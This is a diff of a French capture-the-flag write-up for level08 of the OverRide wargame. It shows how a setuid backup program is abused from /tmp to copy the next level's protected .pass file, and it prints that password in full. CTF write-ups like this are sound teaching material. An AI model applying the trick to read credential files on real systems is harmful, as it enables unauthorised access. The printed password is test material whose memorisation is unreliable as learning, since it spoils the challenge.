@@ -1,39 +1,11 @@
-Testons!
+On voit un executable qui prend un fichier en paramètre, ainsi qu'un dossier backups qui contient un fichier caché .log
 
-nous avons un fichier backups completement vide avec en fichier cache un .log qui est vide.
+Après analyse le programme prend un fichier en paramètre et en crée une sauvegarde dans le dossier backup présent dans le dossier actuel.
 
-"
-level08@OverRide:~$ ./level08
-Usage: ./level08 filename
-ERROR: Failed to open (null)
-"
+Il suffit de se placer dans /tmp afin d'avoir les droits d'écriture dans le dossier actuel et de passer le .pass en paramètre.
 
-"
-level08@OverRide:~$ ./level08 ~level09/.pass
-ERROR: Failed to open ./backups//home/users/level09/.pass
-"
-
-notre programme prend en argument un fichier, il essaie de l'ouvrir en faisant "./backups//home/users/level09/.pass".
-
-nous essayons de creer le pass.
-"
-level08@OverRide:~$ mkdir -p ./backups//home/users/level09
-mkdir: cannot create directory `./backups//home': Permission denied
-"
-
-Interdit!
-
-Donc nous essayons avec "/tmp"
-
-"
-level08@OverRide:~$ mkdir -p /tmp/backups//home/users/level09/
-"
-
-"
-level08@OverRide:/tmp$ cd /tmp
-level08@OverRide:/tmp$ ~/level08 ~level09/.pass
-level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+cd /tmp
+mkdir -p backups/home/users/level09
+~/level08 ~level09/.pass
+cat backups/home/users/level09/.pass
 fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
-"
-
-et nous appelons le programme
